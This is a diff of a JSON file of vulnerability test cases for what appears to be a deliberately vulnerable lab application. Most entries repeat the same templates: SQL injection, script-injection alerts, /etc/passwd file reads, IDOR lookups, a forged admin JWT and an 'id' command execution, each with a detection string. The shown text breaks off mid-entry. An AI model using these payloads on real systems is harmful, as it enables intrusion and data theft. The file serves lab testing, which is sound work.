@@ -1,12 +1,1472 @@
 [
-  { "id": "V-001", "name": "RCE Proof — ID Command", "category": "RCE", "severity": "Critical", "url": "/lab/rce/V-001?cmd=id", "payload": "uid=", "detect": {"type": "body_contains", "value": "uid="}, "auth_required": false, "screenshot": true },
-  { "id": "V-002", "name": "RCE Proof — Hostname", "category": "RCE", "severity": "Critical", "url": "/lab/rce/V-002?cmd=hostname", "payload": "render", "detect": {"type": "body_contains", "value": "render"}, "auth_required": false, "screenshot": true },
-  { "id": "V-003", "name": "SQLi Proof — Database Version", "category": "SQLi", "severity": "Critical", "url": "/lab/sqli/V-003?uid=1 UNION SELECT sqlite_version(),'','','','','',''", "payload": "3.", "detect": {"type": "body_contains", "value": "3."}, "auth_required": false, "screenshot": true },
-  { "id": "V-004", "name": "SQLi Proof — Table Schema", "category": "SQLi", "severity": "Critical", "url": "/lab/sqli/V-004?uid=1 UNION SELECT name,'','','','','','' FROM sqlite_master", "payload": "users", "detect": {"type": "body_contains", "value": "users"}, "auth_required": false, "screenshot": true },
-  { "id": "V-005", "name": "XSS Proof — Alert Injection", "category": "XSS", "severity": "High", "url": "/lab/xss/V-005?p=<script>alert('EXPLOIT-005')</script>", "payload": "EXPLOIT-005", "detect": {"type": "body_contains", "value": "EXPLOIT-005"}, "auth_required": false, "screenshot": true },
-  { "id": "V-006", "name": "XSS Proof — SVG Onload", "category": "XSS", "severity": "High", "url": "/lab/xss/V-006?p=<svg onload=alert('EXPLOIT-006')>", "payload": "EXPLOIT-006", "detect": {"type": "body_contains", "value": "EXPLOIT-006"}, "auth_required": false, "screenshot": true },
-  { "id": "V-007", "name": "LFI Proof — /etc/passwd Leak", "category": "LFI", "severity": "High", "url": "/lab/lfi/V-007?file=/etc/passwd", "payload": "root:x:", "detect": {"type": "body_contains", "value": "root:x:"}, "auth_required": false, "screenshot": true },
-  { "id": "V-008", "name": "LFI Proof — Hostname Leak", "category": "LFI", "severity": "High", "url": "/lab/lfi/V-008?file=/etc/hostname", "payload": "blvwa", "detect": {"type": "body_contains", "value": "blvwa"}, "auth_required": false, "screenshot": true },
-  { "id": "V-009", "name": "IDOR Proof — Admin Email Leak", "category": "IDOR", "severity": "High", "url": "/lab/idor/V-009?target=1", "payload": "admin@burgerlabs.htb", "detect": {"type": "body_contains", "value": "admin@burgerlabs.htb"}, "auth_required": false, "screenshot": true },
-  { "id": "V-010", "name": "IDOR Proof — User Data Leak", "category": "IDOR", "severity": "High", "url": "/lab/idor/V-010?target=2", "payload": "neo@matrix.htb", "detect": {"type": "body_contains", "value": "neo@matrix.htb"}, "auth_required": false, "screenshot": true }
+  {
+    "id": "V-001",
+    "name": "SQLi Impact \u2014 Data Leak Lab #1",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-001?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-002",
+    "name": "XSS Impact \u2014 Script Injection Lab #2",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-002?p=<script>alert('EXPLOIT-2')</script>",
+    "payload": "EXPLOIT-2",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-2"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-003",
+    "name": "LFI Impact \u2014 File Disclosure Lab #3",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-003?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-004",
+    "name": "IDOR Impact \u2014 Private Data Lab #4",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-004?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-005",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #5",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-005",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-006",
+    "name": "RCE Impact \u2014 Command Exec Lab #6",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-006?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-007",
+    "name": "SQLi Impact \u2014 Data Leak Lab #7",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-007?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-008",
+    "name": "XSS Impact \u2014 Script Injection Lab #8",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-008?p=<script>alert('EXPLOIT-8')</script>",
+    "payload": "EXPLOIT-8",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-8"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-009",
+    "name": "LFI Impact \u2014 File Disclosure Lab #9",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-009?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-010",
+    "name": "IDOR Impact \u2014 Private Data Lab #10",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-010?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-011",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #11",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-011",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-012",
+    "name": "RCE Impact \u2014 Command Exec Lab #12",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-012?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-013",
+    "name": "SQLi Impact \u2014 Data Leak Lab #13",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-013?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-014",
+    "name": "XSS Impact \u2014 Script Injection Lab #14",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-014?p=<script>alert('EXPLOIT-14')</script>",
+    "payload": "EXPLOIT-14",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-14"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-015",
+    "name": "LFI Impact \u2014 File Disclosure Lab #15",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-015?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-016",
+    "name": "IDOR Impact \u2014 Private Data Lab #16",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-016?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-017",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #17",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-017",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-018",
+    "name": "RCE Impact \u2014 Command Exec Lab #18",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-018?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-019",
+    "name": "SQLi Impact \u2014 Data Leak Lab #19",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-019?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-020",
+    "name": "XSS Impact \u2014 Script Injection Lab #20",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-020?p=<script>alert('EXPLOIT-20')</script>",
+    "payload": "EXPLOIT-20",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-20"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-021",
+    "name": "LFI Impact \u2014 File Disclosure Lab #21",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-021?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-022",
+    "name": "IDOR Impact \u2014 Private Data Lab #22",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-022?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-023",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #23",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-023",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-024",
+    "name": "RCE Impact \u2014 Command Exec Lab #24",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-024?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-025",
+    "name": "SQLi Impact \u2014 Data Leak Lab #25",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-025?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-026",
+    "name": "XSS Impact \u2014 Script Injection Lab #26",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-026?p=<script>alert('EXPLOIT-26')</script>",
+    "payload": "EXPLOIT-26",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-26"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-027",
+    "name": "LFI Impact \u2014 File Disclosure Lab #27",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-027?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-028",
+    "name": "IDOR Impact \u2014 Private Data Lab #28",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-028?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-029",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #29",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-029",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-030",
+    "name": "RCE Impact \u2014 Command Exec Lab #30",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-030?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-031",
+    "name": "SQLi Impact \u2014 Data Leak Lab #31",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-031?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-032",
+    "name": "XSS Impact \u2014 Script Injection Lab #32",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-032?p=<script>alert('EXPLOIT-32')</script>",
+    "payload": "EXPLOIT-32",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-32"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-033",
+    "name": "LFI Impact \u2014 File Disclosure Lab #33",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-033?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-034",
+    "name": "IDOR Impact \u2014 Private Data Lab #34",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-034?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-035",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #35",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-035",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-036",
+    "name": "RCE Impact \u2014 Command Exec Lab #36",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-036?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-037",
+    "name": "SQLi Impact \u2014 Data Leak Lab #37",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-037?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-038",
+    "name": "XSS Impact \u2014 Script Injection Lab #38",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-038?p=<script>alert('EXPLOIT-38')</script>",
+    "payload": "EXPLOIT-38",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-38"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-039",
+    "name": "LFI Impact \u2014 File Disclosure Lab #39",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-039?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-040",
+    "name": "IDOR Impact \u2014 Private Data Lab #40",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-040?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-041",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #41",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-041",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-042",
+    "name": "RCE Impact \u2014 Command Exec Lab #42",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-042?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-043",
+    "name": "SQLi Impact \u2014 Data Leak Lab #43",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-043?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-044",
+    "name": "XSS Impact \u2014 Script Injection Lab #44",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-044?p=<script>alert('EXPLOIT-44')</script>",
+    "payload": "EXPLOIT-44",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-44"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-045",
+    "name": "LFI Impact \u2014 File Disclosure Lab #45",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-045?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-046",
+    "name": "IDOR Impact \u2014 Private Data Lab #46",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-046?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-047",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #47",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-047",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-048",
+    "name": "RCE Impact \u2014 Command Exec Lab #48",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-048?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-049",
+    "name": "SQLi Impact \u2014 Data Leak Lab #49",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-049?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-050",
+    "name": "XSS Impact \u2014 Script Injection Lab #50",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-050?p=<script>alert('EXPLOIT-50')</script>",
+    "payload": "EXPLOIT-50",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-50"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-051",
+    "name": "LFI Impact \u2014 File Disclosure Lab #51",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-051?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-052",
+    "name": "IDOR Impact \u2014 Private Data Lab #52",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-052?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-053",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #53",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-053",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-054",
+    "name": "RCE Impact \u2014 Command Exec Lab #54",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-054?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-055",
+    "name": "SQLi Impact \u2014 Data Leak Lab #55",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-055?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-056",
+    "name": "XSS Impact \u2014 Script Injection Lab #56",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-056?p=<script>alert('EXPLOIT-56')</script>",
+    "payload": "EXPLOIT-56",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-56"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-057",
+    "name": "LFI Impact \u2014 File Disclosure Lab #57",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-057?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-058",
+    "name": "IDOR Impact \u2014 Private Data Lab #58",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-058?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-059",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #59",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-059",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-060",
+    "name": "RCE Impact \u2014 Command Exec Lab #60",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-060?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-061",
+    "name": "SQLi Impact \u2014 Data Leak Lab #61",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-061?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-062",
+    "name": "XSS Impact \u2014 Script Injection Lab #62",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-062?p=<script>alert('EXPLOIT-62')</script>",
+    "payload": "EXPLOIT-62",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-62"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-063",
+    "name": "LFI Impact \u2014 File Disclosure Lab #63",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-063?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-064",
+    "name": "IDOR Impact \u2014 Private Data Lab #64",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-064?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-065",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #65",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-065",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-066",
+    "name": "RCE Impact \u2014 Command Exec Lab #66",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-066?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-067",
+    "name": "SQLi Impact \u2014 Data Leak Lab #67",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-067?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-068",
+    "name": "XSS Impact \u2014 Script Injection Lab #68",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-068?p=<script>alert('EXPLOIT-68')</script>",
+    "payload": "EXPLOIT-68",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-68"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-069",
+    "name": "LFI Impact \u2014 File Disclosure Lab #69",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-069?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-070",
+    "name": "IDOR Impact \u2014 Private Data Lab #70",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-070?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-071",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #71",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-071",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-072",
+    "name": "RCE Impact \u2014 Command Exec Lab #72",
+    "category": "RCE",
+    "severity": "Critical",
+    "url": "/lab/rce/V-072?cmd=id",
+    "payload": "uid=",
+    "detect": {
+      "type": "body_contains",
+      "value": "uid="
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-073",
+    "name": "SQLi Impact \u2014 Data Leak Lab #73",
+    "category": "SQLI",
+    "severity": "Critical",
+    "url": "/lab/sqli/V-073?uid=1' OR '1'='1",
+    "payload": "admin",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-074",
+    "name": "XSS Impact \u2014 Script Injection Lab #74",
+    "category": "XSS",
+    "severity": "High",
+    "url": "/lab/xss/V-074?p=<script>alert('EXPLOIT-74')</script>",
+    "payload": "EXPLOIT-74",
+    "detect": {
+      "type": "body_contains",
+      "value": "EXPLOIT-74"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-075",
+    "name": "LFI Impact \u2014 File Disclosure Lab #75",
+    "category": "LFI",
+    "severity": "High",
+    "url": "/lab/lfi/V-075?file=/etc/passwd",
+    "payload": "root:x:",
+    "detect": {
+      "type": "body_contains",
+      "value": "root:x:"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-076",
+    "name": "IDOR Impact \u2014 Private Data Lab #76",
+    "category": "IDOR",
+    "severity": "High",
+    "url": "/lab/idor/V-076?target=1",
+    "payload": "admin@burgerlabs.htb",
+    "detect": {
+      "type": "body_contains",
+      "value": "admin@burgerlabs.htb"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-077",
+    "name": "JWT Impact \u2014 Auth Bypass Lab #77",
+    "category": "JWT",
+    "severity": "Critical",
+    "url": "/lab/jwt/V-077",
+    "payload": "eyJpZCI6IDEsICJyb2xlIjogImFkbWluIn0=",
+    "detect": {
+      "type": "body_contains",
+      "value": "Admin Panel"
+    },
+    "auth_required": false,
+    "screenshot": true
+  },
+  {
+    "id": "V-078",
+    "name": "RCE Impact \u2014 Command Exec Lab #78",
